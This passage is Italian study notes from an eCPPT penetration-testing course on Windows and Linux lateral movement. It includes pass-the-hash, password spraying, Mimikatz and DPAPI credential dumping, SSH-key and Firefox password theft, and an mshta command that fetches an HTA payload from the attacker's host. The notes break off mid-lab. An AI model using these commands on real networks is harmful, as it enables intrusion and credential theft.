---
title: "Modulo 05 — Lateral Movement & Pivoting (sintesi consolidata)"
tags:
  - asm
  - client-side
  - crackmapexec
  - credentials
  - hta
  - kerberos
  - lateral-movement
  - linux-privesc
  - metasploit
  - mimikatz
  - mssql
  - nmap
  - nse
  - ntlm
  - pass-the-hash
  - pass-the-ticket
  - password-spraying
  - persistence
  - pivoting
  - port-forwarding
  - rdp
  - regeorg
  - registers
  - scanning
  - silver-ticket
  - smb
  - socks
  - ssh-tunnel
  - sudo
  - winrm
---
# Modulo 05 — Lateral Movement & Pivoting (sintesi consolidata)

> **Corso:** eCPPT Penetration Testing Professional (NEW - 2024)
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Video coperti:** 16/16 — dal video `01_Course Introduction` al `016_Course Conclusion`
> **Formato esame:** 45 domande a risposta multipla su ambiente pratico (no report)
> **Sorgente video:** `../Lateral Movement & Pivoting/`

Sintesi rielaborata, organizzata per area tematica (Windows LM, Linux LM, Pivoting),
con cheat sheet, diagrammi ASCII di topologia, tabelle comparative e una tabella
decisionale finale (quando usare cosa). Tutti i comandi sono fedeli a quanto
mostrato nei video.

---

## Indice

1. [Concetti fondamentali](#1-concetti-fondamentali)
2. [Glossario rapido](#2-glossario-rapido)
3. [Windows Lateral Movement](#3-windows-lateral-movement)
   1. [Panoramica e workflow](#31-panoramica-e-workflow-windows)
   2. [PsExec (SysInternals + Impacket)](#32-psexec-sysinternals--impacket)
   3. [SMBExec (Impacket)](#33-smbexec-impacket)
   4. [CrackMapExec / NetExec](#34-crackmapexec--netexec)
   5. [RDP](#35-rdp-remote-desktop-protocol)
   6. [WinRM (evil-winrm)](#36-winrm-evil-winrm)
   7. [Pass-the-Hash con Metasploit](#37-pass-the-hash-con-metasploit)
   8. [Pass-the-Hash con WMIExec](#38-pass-the-hash-con-wmiexec)
4. [Linux Lateral Movement](#4-linux-lateral-movement)
5. [Pivoting](#5-pivoting)
   1. [Concetti generali e topologie](#51-concetti-generali-e-topologie)
   2. [Metasploit route + portfwd](#52-metasploit-route--portfwd)
   3. [SOCKS Proxy (MSF + proxychains)](#53-socks-proxy-msf--proxychains)
   4. [SSH Tunneling (-L / -R / -D)](#54-ssh-tunneling--l--r--d)
   5. [reGeorg (HTTP tunneling via web shell)](#55-regeorg-http-tunneling-via-web-shell)
6. [Tabelle decisionali (cosa-usare-quando)](#6-tabelle-decisionali)
7. [Cheat sheet impacket consolidato](#7-cheat-sheet-impacket-consolidato)
8. [Cheat sheet proxychains / SOCKS](#8-cheat-sheet-proxychains--socks)
9. [Punti d'attenzione per l'esame eCPPT](#9-punti-dattenzione-per-lesame-ecppt)
10. [Mappa video → file sorgente](#10-mappa-video--file-sorgente)

---

## 1. Concetti fondamentali

Due tecniche **post-exploitation** distinte che vengono spesso confuse. Il corso
le insegna in modo esplicitamente separato perché tool, protocolli e sintassi
cambiano. Prerequisito di entrambe è un **foothold iniziale** già ottenuto.

### Lateral Movement (LM)
- **Definizione**: spostarsi da un host compromesso ad altri host **della stessa
  rete/segmento**, riutilizzando credenziali, hash o ticket.
- **Obiettivo**: estendere accesso e privilegi, raggiungere high-value target.
- **Mezzi**: protocolli di autenticazione remota (SMB, RDP, WinRM, WMI su
  Windows; SSH su Linux), credential reuse, Pass-the-Hash, Pass-the-Ticket.
- **Su Windows** si possono usare gli **hash NTLM** (Pass-the-Hash via SMB) oltre
  alle password in chiaro; **su Linux** si usano password in chiaro o **chiavi
  SSH** (non esiste un "hash" auth-equivalente nativo).

### Pivoting
- **Definizione**: usare un host compromesso come **stepping stone (pivot)** per
  raggiungere **un'altra rete/segmento** altrimenti non instradabile
  dall'attaccante.
- **Obiettivo**: bypassare i confini di rete, raggiungere DMZ → LAN interna,
  segmenti isolati.
- **Mezzi**: routing/forwarding (port forwarding, SSH tunneling, SOCKS proxy,
  VPN, HTTP tunneling).
- **Prerequisito strutturale**: il pivot deve avere **almeno due interfacce di
  rete** (o comunque routing verso la rete target).

### Differenze chiave (la tabella d'esame)

| Aspetto       | Lateral Movement                            | Pivoting                                              |
|---------------|---------------------------------------------|-------------------------------------------------------|
| **Scope**     | Stessa rete/segmento                        | Da una rete a un'altra                                |
| **Approach**  | Exploit, credential reuse, hash             | Routing, tunnel, proxy                                |
| **Objective** | Privilege escalation, espandere accesso     | Superare network boundaries, raggiungere reti isolate |
| **Tool tipo** | PsExec, WMIExec, Evil-WinRM, SSH            | `autoroute`, `portfwd`, `socks_proxy`, `ssh -D`, reGeorg |

Le due tecniche **si combinano sempre**: tipicamente prima si **pivota** in una
rete interna, poi al suo interno si fa **lateral movement**.

### Diagramma generale del pivoting

```
   Attacker                  Pivot/Compromised             Target interno
 (192.168.1.2)              Victim 1                       Victim 2
       |              +----------------------+                 |
       |   eth0       | eth0  192.168.1.X    |                 |
       |--------------|                      |                 |
       | 192.168.1.0/24                      |                 |
                      | eth1  10.10.10.X     |  10.10.10.0/24  |
                      |----------------------|-----------------|

   L'attacker NON vede direttamente 10.10.10.0/24
   → passa attraverso Victim 1 (dual-homed)
```

---

## 2. Glossario rapido

| Termine | Significato in 1 riga |
|---|---|
| **PtH** (Pass-the-Hash) | Autenticarsi NTLM usando l'hash NT al posto della password |
| **PtT** (Pass-the-Ticket) | Riutilizzare un ticket Kerberos (coperto nel modulo AD) |
| **NTLM** | Protocollo challenge-response Microsoft, ancora supportato per backward compat |
| **DPAPI** | Data Protection API: cifra credenziali per-utente con master key derivata dal password |
| **WMI** | Windows Management Instrumentation — interfaccia di management su DCOM/RPC |
| **WinRM** | Windows Remote Management — implementazione MS di WS-Management |
| **Meterpreter** | Payload Metasploit avanzato, in-memory, scriptable |
| **Bind payload** | L'attaccante si connette al target su una porta che il target apre |
| **Reverse payload** | Il target si connette all'attaccante (richiede egress) |
| **SOCKS proxy** | Proxy generico TCP (4/5) — usato con `proxychains` per tunnellare tool esterni |
| **`proxychains`** | Wrapper Linux che intercetta syscall di rete e le inoltra a un proxy |
| **Pwn3d!** | Indicatore CME = utente è local admin → exec disponibile |
| **`NT AUTHORITY\SYSTEM`** | Account di sistema Windows con privilegi massimi |
| **ADMIN$** | Share amministrativa nascosta su `C:\Windows` (usata da PsExec/SMBExec) |
| **IPC$** | Inter-Process Communication share (named pipes) |

---

## 3. Windows Lateral Movement

### 3.1 Panoramica e workflow Windows

Il LM Windows è quasi sempre **credential-based**: una volta in possesso di
clear-text password, NTLM hash o ticket Kerberos, non serve altro exploit —
si usa **autenticazione legittima** (difficile da detectare).

#### Tecniche principali (dal video 03)

1. **Pass-the-Hash (PtH)** — uso dell'NTLM hash su SMB (e WinRM/WMI con tool
   ad-hoc). Possibile perché SMB Windows accetta NTLM challenge-response: il
   client **non invia mai la password in chiaro**, basta l'hash.
2. **Pass-the-Ticket (PtT)** — uso di ticket Kerberos catturati (Rub⁠eus,
   Mimi⁠katz). Trattato nel modulo Active Directory, **non qui**.
3. **Credential Reuse** — uso di clear-text password per protocolli che NON
   accettano hash (RDP, WinRM basic).
4. **Golden / Silver Tickets** — forge di ticket Kerberos per persistence
   (modulo AD).

#### Protocolli Windows abusabili (porte da memorizzare)

| Protocollo | Porta | Auth | PtH? | Tool offensive |
|------------|-------|------|------|----------------|
| **SMB** | 445 (139 NetBIOS legacy) | NTLM | **Sì** | PsExec, SMBExec, WMIExec via SMB, CME |
| **RDP** | 3389 | NTLM / Kerberos | **No** (clear-text — salvo Restricted Admin Mode) | xfreerdp, rdesktop, MSF |
| **WinRM** | 5985 (HTTP) / 5986 (HTTPS) | NTLM / Basic / Kerberos | **Sì** | Evil-WinRM, CME `winrm`, PS Remoting |
| **WMI** | 135 (RPC EPM) + dynamic 49152-65535 | NTLM | **Sì** | `wmiexec.py`, MSF, `Invoke-WmiMethod` |

#### Workflow concettuale (qualunque tecnica)

```
[ Foothold iniziale ]
        |
        v
[ Credential dumping ]  (Mimi⁠katz, hash⁠dump, SAM, LSA, file rdg, browser DPAPI...)
        |
        v
[ Selezione protocollo ]  (SMB / WMI / WinRM / RDP in base a porte aperte e priv)
        |
        v
[ Autenticazione legittima ]
        |
        v
[ Remote command execution / shell / Meterpreter ]
        |
        v
[ Loop: dump cred del nuovo host → prossimo hop ]
```

#### Tool catch-all del modulo (riassunto)

| Tool | Categoria | Scopo |
|---|---|---|
| **PsExec** (SysInternals) | Windows native exe | Esec remota via SMB, crea servizio |
| **`psexec.py`** (Impacket) | Python | Equivalente Linux di PsExec |
| **`smbexec.py`** (Impacket) | Python | Come psexec, più silenzioso (no service classico) |
| **`wmiexec.py`** (Impacket) | Python | Esec via WMI/DCOM |
| **CrackMapExec / NetExec** | Multi-proto | Spray, PtH, exec, moduli |
| **Evil-WinRM** | WinRM | Shell PowerShell interattiva via WinRM |
| **Mimi⁠katz** | Credential dump | NTLM hash, Kerberos ticket, DPAPI |
| **MSF `windows/smb/psexec`** | Metasploit | PtH → Meterpreter integrato |

---

### 3.2 PsExec (SysInternals + Impacket)

**Video sorgente:** [04_Lateral Movement with PsExec.md](../Lateral%20Movement%20&%20Pivoting/04_Lateral%20Movement%20with%20PsExec.md)

#### Cos'è
- Utility SysInternals (Mark Russinovich) per esecuzione comandi remoti su
  Windows tramite **SMB**.
- Implementazione cross-platform: **Impacket `psexec.py`** (uso primario su Kali).
- Accetta sia **clear-text password** sia **NTLM hash** (PtH).
- Risultato: **`NT AUTHORITY\SYSTEM`** sul target.

#### Workflow interno (4 fasi)
1. **SMB connect** verso il target sulla porta 445 con NTLM auth.
2. **Named pipe creation** sul target (canale client-server).
3. **Temp service install**: upload eseguibile su `ADMIN$`, crea+avvia servizio.
4. **Execution & cleanup**: esegue payload, rimuove il servizio. **I log
   restano** (Event ID 7045 service install, 4624/4672 logon, file in ADMIN$).

#### Prerequisiti
- Membership in **local Administrators** sul target (o domain admin in AD).
- Accesso a share **IPC$** + permessi di creare/avviare servizi.

#### NTLM challenge-response (perché PtH funziona)
1. Client → richiesta connessione.
2. Server → **challenge** (random number).
3. Client → response = challenge cifrato con **NTLM hash** della password.
4. Server → verifica con l'hash salvato.

→ Il client **non invia mai la password in chiaro** → **l'hash basta** → PtH.
NTLMv1 = DES (deprecato), NTLMv2 = client+server challenge (standard moderno).

#### Comandi

```bash
# Verifica SMB e dialetti
nmap -p 445 --script smb-protocols <TARGET_IP>

# Brute force SMB v2 con Hydra (utente administrator)
hydra -l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb2://<TARGET_IP>

# Username + password enum
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt \
      -I smb2://<TARGET_IP>

# PsExec (Impacket) con clear-text
psexec.py administrator:<password>@<TARGET_IP>

# PsExec con NTLM hash (PtH) — formato LM:NT
psexec.py -hashes <LM>:<NT> administrator@<TARGET_IP>

# Solo NT? → 32 zeri come LM placeholder
psexec.py -hashes 00000000000000000000000000000000:<NT_HASH> administrator@<TARGET_IP>
```

#### Esempio fallimento atteso (utente non admin)
```
psexec.py sysadmin:<password>@<TARGET_IP>
→ fallisce: l'utente non ha privilegi per creare servizi / IPC$
```

#### Punti d'attenzione esame
- **PsExec richiede account in local Administrators** (domanda ricorrente).
- **Una volta autenticato → SYSTEM** (no priv esc).
- **Hash format Impacket**: `LM:NT`. Solo NT? → 32 zeri davanti.
- **Porta SMB 445**.
- **PsExec è LOUD**: Event 7045 + file in ADMIN$. Alternative più silenziose
  sono **SMBExec** (no service classico) e **WMIExec** (no SMB share write).
- Distinguere `PsExec.exe` (SysInternals native) ≠ `psexec.py` (Impacket).

---

### 3.3 SMBExec (Impacket)

**Video sorgente:** [05_Lateral Movement with SMBExec.md](../Lateral%20Movement%20&%20Pivoting/05_Lateral%20Movement%20with%20SMBExec.md)

#### Cos'è
- Tool Impacket per remote command execution su Windows via **SMB**.
- Simile a PsExec ma **NON crea un servizio temporaneo classico** → footprint
  più pulito (no Event 7045 standard).
- Sfrutta meccanismi tipo WMI / "semi-service" per evitare il service install.
- Richiede comunque **credenziali admin**.
- Supporta **clear-text** e **NTLM hash** (PtH).
- Fornisce una **semi-interactive shell** (output bufferizzato, no full TTY).

#### SMBExec vs PsExec — differenza chiave

| Aspetto | PsExec | SMBExec |
|---|---|---|
| Trasporto | SMB (445) | SMB (445) |
| Esecuzione | **Servizio temporaneo** classico | **WMI / metodi alternativi** |
| Shell | Command prompt full | **Semi-interactive** |
| Rumore | Loud (Event 7045) | Più pulito |
| Hash auth | Sì | Sì |
| Admin richiesto | Sì | Sì |

#### Comandi

```bash
nmap -p 445 --script smb-protocols <TARGET_IP>

# SMBExec con clear-text
smbexec.py administrator:<password>@<TARGET_IP>

# SMBExec con NTLM hash (PtH)
smbexec.py -hashes 00000000000000000000000000000000:<NT_HASH> administrator@<TARGET_IP>

# Dentro la semi-interactive shell
whoami
whoami /priv
hostname
net user
```

#### Upgrade a Meterpreter (workflow tipico)

```
# In msfconsole:
use exploit/windows/misc/hta_server
set payload windows/meter⁠preter/reverse_tcp
set LHOST <KALI_IP>
exploit

# Nella SMBExec shell:
mshta.exe http://<KALI_IP>:8080/xxxxx.hta
→ Meterpreter session
```

#### Punti d'attenzione esame
- **Differenza PsExec vs SMBExec** = domanda ricorrente (creazione servizio).
- Errore **`RPC_ACCESS_DENIED`** = utente non admin.
- Shell è **semi-interactive** → per workflow lunghi upgrade a Meterpreter
  (HTA / `web_delivery`).

---

### 3.4 CrackMapExec / NetExec

**Video sorgente:** [06_Lateral Movement with CrackMapExec.md](../Lateral%20Movement%20&%20Pivoting/06_Lateral%20Movement%20with%20CrackMapExec.md)

> **Nota storica:** CrackMapExec (CME) è stato sostituito dal fork attivo
> **NetExec (nxc)** dal 2024. Sintassi praticamente identica. Nel corso si
> usa `crackmapexec`.

#### Cos'è
- "Swiss army knife for pentesting networks" → **catch-all** per Windows LM.
- Supporta multipli protocolli: **SMB, WinRM, MSSQL, SSH, LDAP**.
- Funzioni: password spray, brute force, credential validation, PtH, command
  execution, hash dump, **moduli** avanzati.
- Può girare su interi subnet simultaneamente.
- Non fornisce shell interattiva: esegue comandi singoli o invoca moduli.

#### Sintassi base
```
crackmapexec <protocol> <target(s)> -u <user> -p <password|wordlist> [--local-auth] [options]
```
- `<protocol>` **deve essere il primo argomento**.
- `<target>` può essere IP, range, CIDR, file.
- `--local-auth` forza auth come local account (evita lookup domain).

#### Indicatori output
- `[+]` verde → credenziale valida ma **senza** privilegi exec.
- `[+] (Pwn3d!)` → credenziale valida **+ local admin** → exec disponibile.
- `[-]` → fallita.

#### Esecuzione comandi
- `-x '<cmd>'` → **CMD**.
- `-X '<ps_cmd>'` → **PowerShell**. (Lowercase vs UPPERCASE = domanda esame.)

#### PtH con CME
```
crackmapexec smb <target> -u administrator -H <NT_HASH>
```
`-H` accetta direttamente NT hash (no formato LM:NT).

#### Comandi nativi SMB (no moduli)
`--shares`, `--sessions`, `--disks`, `--loggedon-users`, `--sam`, `--lsa`,
`--ntds`.

#### Moduli (`-M <name> -o KEY=value`)
- `-L` → lista moduli.
- Notevoli: `mimi⁠katz`, `lsassy`, `web_delivery`, `rdp`, `enum_dns`, `wdigest`.

#### Workflow completo (dal lab)

```bash
# 1. Spray administrator
crackmapexec smb <TARGET> -u administrator \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# → password trovata → "Pwn3d!"

# 2. Validazione + exec comando
crackmapexec smb <TARGET> -u administrator -p 'Sebastian' -x whoami
# → nt authority\system

# 3. Dump SAM (NTLM hash)
crackmapexec smb <TARGET> -u administrator -p 'Sebastian' --sam

# 4. PtH con l'hash appena ottenuto
crackmapexec smb <TARGET> -u administrator -H <NT_HASH> -x ipconfig

# 5. Spray UxP per scoprire altri account
crackmapexec smb <TARGET> \
  -u /usr/share/metasploit-framework/data/wordlists/common_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# 6. Meterpreter via modulo web_delivery
crackmapexec smb <TARGET> -u administrator -p 'Sebastian' \
  -M web_delivery -o URL=http://<KALI_IP>:8080/xxxxx

# 7. Abilita RDP da remoto
crackmapexec smb <TARGET> -u administrator -p 'Sebastian' -M rdp -o ACTION=enable
```

#### Punti d'attenzione esame
- **Sintassi**: protocollo come **primo argomento**.
- `-x` (CMD) vs `-X` (PowerShell).
- **`Pwn3d!`** = local admin.
- `--local-auth` in AD per forzare local.
- `-H <NT_HASH>` (no LM).
- Protocolli: SMB, WinRM, MSSQL, SSH, LDAP (RDP solo via modulo).

---

### 3.5 RDP (Remote Desktop Protocol)

**Video sorgente:** [07_Lateral Movement via RDP.md](../Lateral%20Movement%20&%20Pivoting/07_Lateral%20Movement%20via%20RDP.md)

#### Cos'è
- Porta **3389**, accesso GUI a Windows.
- **NON supporta Pass-the-Hash** in modalità standard → serve **clear-text
  password**. (Eccezione: **Restricted Admin Mode** abilitato → PtH-RDP
  possibile, caso edge.)
- Tool client da Linux: **xfreerdp**, `rdesktop`, `remmina`.

#### Scenario lab (lateral movement realistico)
1. **Initial access** Victim 1: exploit Rejetto/BadBlue → Meterpreter come
   SYSTEM, `migrate -N lsass.exe`.
2. **Local enum**: cerca file `.rdg` (RDCMan) in `C:\Users\Administrator\Documents\`.
3. `.rdg` contiene credenziali RDP **cifrate con DPAPI**.
4. Upload **SharpDPAPI** sul target.
5. `SharpDPAPI.exe rdg` → identifica che serve la master key DPAPI.
6. Estrai master key con Mimi⁠katz/Kiwi: `kiwi_cmd "sekur⁠lsa::dpapi"` → GUID + SHA1.
7. `SharpDPAPI.exe rdg /unprotect:<GUID>:<SHA1>` → password in chiaro.
8. `xfreerdp /u:administrator /p:<PWD> /v:<VICTIM2_IP>` → login Victim 2.

#### DPAPI in breve
- Data Protection API Windows: cifra credenziali per-utente con master key
  derivata dalla password utente.
- Cifra: `.rdg` (RDCMan), browser saved passwords, vault Windows, ecc.
- Per decifrare serve la **master key**, ottenibile via Mimi⁠katz da LSASS.

#### Comandi chiave

```bash
# Recon
nmap -sS -sV -T4 <VICTIM1_IP>

# Exploit BadBlue (MSF)
use exploit/windows/http/badblue_passthru
set RHOSTS <VICTIM1_IP>
exploit
migrate -N lsass.exe

# Trova .rdg
cd C:\\Users\\Administrator\\Documents
ls
cat production_server.rdg

# DPAPI workflow
upload /root/Desktop/tools/SharpDPAPI.exe
shell
SharpDPAPI.exe rdg     # → "Master key needed" + GUID
exit
load kiwi
kiwi_cmd "sekur⁠lsa::dpapi"
shell
SharpDPAPI.exe rdg /unprotect:<GUID>:<SHA1_MASTERKEY>

# RDP da Kali
xfreerdp /u:administrator /p:<password_in_chiaro> /v:<VICTIM2_IP>
```

#### Punti d'attenzione esame
- **RDP = 3389, NO PtH** standard.
- **`.rdg` files = goldmine DPAPI** di credenziali RDP salvate.
- **`sekur⁠lsa::dpapi`** in Mimi⁠katz/Kiwi richiede SYSTEM/LSASS access.
- **SharpDPAPI** = porting C# del modulo DPAPI di Mimi⁠katz.
- **NLA (Network Level Authentication)** → richiede creds prima di sessione.
- **Restricted Admin Mode** → PtH-RDP eccezionalmente possibile.

---

### 3.6 WinRM (evil-winrm)

**Video sorgente:** [08_Lateral Movement via WinRM.md](../Lateral%20Movement%20&%20Pivoting/08_Lateral%20Movement%20via%20WinRM.md)

#### Cos'è
- **WinRM (Windows Remote Management)** = implementazione MS di WS-Management.
- Porte: **5985 (HTTP)** / **5986 (HTTPS)**.
- Pensato come "SSH-equivalente per Windows", spesso lasciato attivo in prod.
- Auth: **NTLM** (default), **Kerberos** (AD), **Basic** (debole, solo HTTPS),
  **Negotiate**.
- Privilegi richiesti: **local Administrators** OR gruppo **Remote Management Users**.
- **`Enable-PSRemoting`** è separato da WinRM: PS Remoting è su WinRM ma va
  abilitato esplicitamente lato target.

#### Tool a confronto

| Tool | Best for | Note |
|---|---|---|
| **Evil-WinRM** | Shell interattiva + script in-memory | De facto standard offensive |
| **CME `winrm`** | Spray, validation, exec singoli | No shell |
| **PowerShell Remoting** (`Enter-PSSession`) | Living-off-the-land | Richiede `Enable-PSRemoting` sul target |

#### Evil-WinRM — superpoteri
- Shell PowerShell completa.
- Loading di script PowerShell **in memoria** (`-s <folder>`) → no disk write.
- Loading di **C# executables** (`-e <folder>`).
- PtH-WinRM: `-H <NT_HASH>`.
- Realm/Kerberos: `-r <domain>`.
- SSL: `-S` (per 5986).

#### Comandi

```bash
# Recon
nmap -p 5985,5986 -sV <TARGET_IP>

# CME WinRM: spray
crackmapexec winrm <TARGET_IP> -u administrator \
  -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# CME WinRM: exec
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321' -x 'whoami'
crackmapexec winrm <TARGET_IP> -u administrator -p 'rock_and_roll_123321' -X 'Get-Process'

# Evil-WinRM password
evil-winrm -u administrator -p 'rock_and_roll_123321' -i <TARGET_IP>

# Evil-WinRM PtH
evil-winrm -u administrator -H <NT_HASH> -i <TARGET_IP>

# Evil-WinRM con script in-memory
evil-winrm -u administrator -p '...' -i <TARGET_IP> -s /root/Desktop/tools/scripts

# Dentro: carica Mimi⁠katz in memoria
*Evil-WinRM* PS> Invoke-Mi⁠mi⁠katz.ps1
*Evil-WinRM* PS> Invoke-Mi⁠mi⁠katz -Command '"sekur⁠lsa::logonpasswords"'

# Evil-WinRM SSL (5986)
evil-winrm -u administrator -p '...' -i <TARGET_IP> -S

# PowerShell Remoting (da Kali con pwsh)
pwsh
$cred = Get-Credential
Enter-PSSession -ComputerName <TARGET_IP> -Authentication Negotiate -Credential $cred

# Sul target (se Remoting non attivo)
Enable-PSRemoting -Force
```

#### Punti d'attenzione esame
- **Porte 5985 / 5986** (domanda fissa).
- **WinRM ≠ PS Remoting**: PS Remoting è su WinRM ma serve `Enable-PSRemoting`.
- Privilegi: local admin OR **Remote Management Users**.
- **PtH-WinRM funziona** (a differenza di RDP): `evil-winrm -H <NT_HASH>`.
- Loading script in memoria con `-s` = **bypass AV / no disk artifact**.
- Flag Evil-WinRM da sapere: `-u`, `-p`, `-H`, `-i`, `-s`, `-e`, `-S`, `-r`.

---

### 3.7 Pass-the-Hash con Metasploit

**Video sorgente:** [09_Pass-the-Hash with Metasploit.md](../Lateral%20Movement%20&%20Pivoting/09_Pass-the-Hash%20with%20Metasploit.md)

#### Cos'è
- Modulo **`exploit/windows/smb/psexec`** in MSF accetta sia password sia hash.
- Vantaggio chiave rispetto a `psexec.py` Impacket: **Meterpreter session
  integrata** → no upgrade via `web_delivery`. Perfetto pivot point (`autoroute`,
  `portfwd`, `socks_proxy`).

#### Workflow interno
1. Connessione SMB 445 al target.
2. Auth NTLM con username + (password o NT hash).
3. Upload service binary su `ADMIN$`.
4. Crea servizio temp che esegue il payload Meterpreter.
5. Payload → multi-handler → Meterpreter come **SYSTEM**.
6. Cleanup servizio.

#### Formato hash
- Campo `SMBPass` accetta `LM:NT`.
- Solo NT? → 32 zeri davanti: `00000000000000000000000000000000:<NT_HASH>`.
- Alternativa valida: `aad3b435b51404eeaad3b435b51404ee:<NT>` (LM "vuoto" reale,
  DES di stringa nulla).

#### Comandi

```bash
msfconsole -q
msf6 > search psexec
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <TARGET_IP>
msf6 > set SMBUser administrator
msf6 > set SMBPass 00000000000000000000000000000000:<NT_HASH>

# Su target x64 forzare:
msf6 > set payload windows/x64/meter⁠preter/reverse_tcp
msf6 > set LHOST <KALI_IP>
msf6 > exploit

meterpreter > getuid       # → NT AUTHORITY\SYSTEM
meterpreter > getprivs
meterpreter > sysinfo
```

#### Punti d'attenzione esame
- Nome modulo esatto: **`exploit/windows/smb/psexec`**.
- Formato `SMBPass` = `LM:NT` (32 zeri se solo NT).
- Username deve essere **local admin**.
- Risultato: **SYSTEM** → no priv esc richiesta.
- Preferire MSF quando il target sarà **pivot per i prossimi step** (autoroute,
  socks_proxy). Preferire Impacket per portabilità / proxychains-friendly.

---

### 3.8 Pass-the-Hash con WMIExec

**Video sorgente:** [010_Pass-the-Hash with WMIExec.md](../Lateral%20Movement%20&%20Pivoting/010_Pass-the-Hash%20with%20WMIExec.md)

#### Cos'è
- **WMI** = Windows Management Instrumentation, su **DCOM/RPC**.
- Porte: **TCP 135** (RPC endpoint mapper) + porta **dinamica 49152–65535**.
- **`wmiexec.py`** (Impacket) = remote command exec via WMI, supporta PtH.
- Più stealthy di PsExec: **NO service**, **NO file su ADMIN$**.
- Shell **semi-interactive** (ogni comando = WMI call separata).
- Supporta `-shell-type cmd|powershell`.

#### Stack di comunicazione

```
Attacker (Kali)  ──> TCP 135  ──────────────────────────> Target (RPC EPM)
                                                            │ negozia porta dinamica
                  <── TCP 49152-65535 (Dynamic RPC) ──────  │
                                                            │
                  ──── WMI request (Win32_Process.Create) ──>
                  <──── output (via SMB trick) ──────────────
```

L'intervallo dinamico **può essere ristretto via GPO/registry** → in alcune
reti il pentester trova solo poche porte alte aperte oltre la 135.

#### WMIExec vs alternative

| Tecnica | Servizio? | Scrive su share? | Porte | Detection |
|---|---|---|---|---|
| PsExec | Sì (temp) | ADMIN$ | SMB 445 | Alta (Event 7045) |
| SMBExec | No (semi) | ADMIN$ | SMB 445 | Media |
| **WMIExec** | **No** | **No** | **135 + dyn RPC** | **Bassa** |

#### Comandi

```bash
# PtH WMIExec
wmiexec.py -hashes 00000000000000000000000000000000:<NT_HASH> administrator@<TARGET>

# Clear-text
wmiexec.py administrator:<password>@<TARGET>

# Con dominio AD
wmiexec.py -hashes :<NT_HASH> domain.local/administrator@<TARGET>

# Shell PowerShell
wmiexec.py -shell-type powershell -hashes :<NT_HASH> administrator@<TARGET>

# Share output alternativa
wmiexec.py -share C$ -hashes :<NT_HASH> administrator@<TARGET>
```

#### Punti d'attenzione esame
- **WMI = 135 + dynamic RPC 49152-65535**.
- **No service**, **no ADMIN$ write** → tecnica più stealthy (domanda esame).
- Hash format: `LM:NT` (oppure `:` davanti se solo NT).
- Comando wrapper interno: **`Win32_Process.Create`**.
- Detection: Sysmon Event ID 1 con parent `WmiPrvSE.exe`.
- Privilegi: local Administrators (per `Win32_Process.Create`).

---



### Quiz: Pass-the-Hash con Metasploit e WMIExec

<div class="ecppt-quiz" data-module="05_Lateral_Movement_Pivoting" data-block="2"></div>

## 4. Linux Lateral Movement

**Video sorgente:** [011_Linux Lateral Movement Techniques.md](../Lateral%20Movement%20&%20Pivoting/011_Linux%20Lateral%20Movement%20Techniques.md)

### Differenza chiave con Windows
Niente NTLM, niente WMI/SMB nativo, niente Kerberos by-default. Il LM Linux è
essenzialmente **autenticarsi ad altri host via SSH** (porta 22) sfruttando:

1. **Password riusate** (credential reuse cross-host).
2. **Chiavi SSH** lasciate in `~/.ssh/`.
3. **Credenziali scoperte** in file/DB/mail/browser.
4. **`su`** intra-host per cambiare utente quando si trova una password
   (più subdolo perché non genera log SSH).

L'equivalente Linux dell'"hash equivalency" Windows è la **SSH private key**:
chi la possiede = autenticato.

### Topologia tipica del lab

```
[Kali] ── SSH ──> [Target 1 / sansa] ── id_rsa ──> [Target 2 / kate]
                       │                                    │
                       │                                    └─ SQLite → password bron
                       │                                                          │
                       │                                                          v
                       │                          [Target 3 / bron]  (Firefox creds → robert)
                       │                                                          │
                       └─ credentials.txt: danny → FTP/SSH → ...                  v
                                                                       [Target 4 / robert]
                                                                            via /var/mail
```

### Fonti di credenziali ricorrenti
- `~/.bash_history` (la #1 — sempre cattarlo per primo).
- `~/.ssh/id_rsa`, `id_ed25519` (chiavi private).
- File di configurazione applicativi (`.env`, `config.php`, ecc.).
- DB SQLite locali (tabelle `users` con cred in chiaro o hash deboli).
- **Profili Firefox**: `key4.db` + `logins.json` → decifrare con **firepwd**.
- `/var/mail/<user>` (email con password — pattern frequente nei lab).

### Pattern di enumeration locale (cosa cercare)

```bash
# Identità
whoami; id; pwd

# Utenti
cat /etc/passwd
cat ~/.bash_history
ls -la /home/*/

# SSH keys
ls -la ~/.ssh/
find / -name id_rsa 2>/dev/null

# DB SQLite
find / -name "*.sqlite*" 2>/dev/null

# Firefox stored passwords
ls -la ~/.mozilla/firefox/
# (poi scp di key4.db + logins.json → firepwd su Kali)

# Mail
cat /var/mail/<user>

# PrivEsc path
sudo -l
```

### SSH key abuse

```bash
# Copia su Kali
scp user@target:/path/to/id_rsa .

# SSH rifiuta key con permessi laschi
chmod 400 id_rsa

# Login
ssh -i id_rsa target_user@<NEXT_HOP>
```

### Firefox stored passwords (firepwd)

Firefox cifra `logins.json` con master key in `key4.db`. **firepwd** (Python2)
decifra entrambi:

```bash
# Su Kali, dopo scp dei due file:
cd firepwd/
python2 firepwd.py     # legge key4.db + logins.json dalla cwd
# → user:pass in chiaro
```

### SQLite

```bash
sqlite3 database.sqlite
sqlite> .tables
sqlite> SELECT * FROM users;
sqlite> .quit
```

### `su` per cambiare utente (intra-host)

```bash
su <username>
# Inserisci la password trovata → shell come quell'utente
# Niente log SSH, più silenzioso del re-login
```

### Esempio pratico end-to-end (riassunto del lab)

```bash
# 1. Discovery rete interna
ifconfig
nmap -sn 192.168.0.0/20
nmap -sV 192.168.69.{3,4,5,6}
# tutti SSH; target3 anche FTP (vsftpd)

# 2. Foothold target1 (cred date)
ssh sansa@192.168.69.3        # pass: welcome@123
cat ~/.bash_history            # → "ssh -i id_rsa kate@<target2>"

# 3. Pivot a target2 via SSH key
scp sansa@192.168.69.3:~/id_rsa .
chmod 400 id_rsa
ssh -i id_rsa kate@192.168.69.4

# 4. Su target2: enum + SQLite → password bron
sqlite3 /home/bron/database.sqlite
sqlite> SELECT * FROM users;
su bron

# 5. Da kate: dump Firefox profile → firepwd → bron@target3
scp kate@192.168.69.4:~/.mozilla/firefox/xxx.default/{key4.db,logins.json} .
python2 firepwd.py

